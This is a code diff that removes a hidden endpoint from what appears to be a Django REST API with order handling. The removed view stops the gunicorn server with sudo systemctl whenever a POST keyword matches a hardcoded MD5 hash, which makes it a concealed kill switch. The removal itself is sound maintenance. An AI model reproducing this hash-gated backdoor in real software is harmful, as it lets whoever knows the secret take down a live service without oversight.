@@ -305,26 +305,3 @@ class SubmitOrderView(APIView):
         except Exception as e:
             return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)
 
-class chronostasisView(APIView):
-    def post(self, request):
-        keyword = request.data.get('keyword')
-        service_name = "gunicorn"
-        if keyword is None:
-            return Response({'error': 'keyword is required'}, status=status.HTTP_400_BAD_REQUEST)
-        else:
-            res = hashlib.md5(keyword.encode())
-            code = res.hexdigest()
-            if code == "788d795e5b7fdd4b1f56ee60b6441e2c":
-
-                try:
-                    result = subprocess.run(
-                        ["sudo", "systemctl", "stop", service_name],
-                        check=True,  # Raises CalledProcessError if the command fails
-                        capture_output=True,  # Captures stdout and stderr for debugging
-                        text=True  # Decodes the output into a readable string
-                    )
-                    return Response({'message' : f"Successfully stopped {service_name}"} , status=status.HTTP_200_OK)
-                except subprocess.CalledProcessError as e:
-                    return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
-            else:
-                return Response({'success': False}, status=status.HTTP_400_BAD_REQUEST)
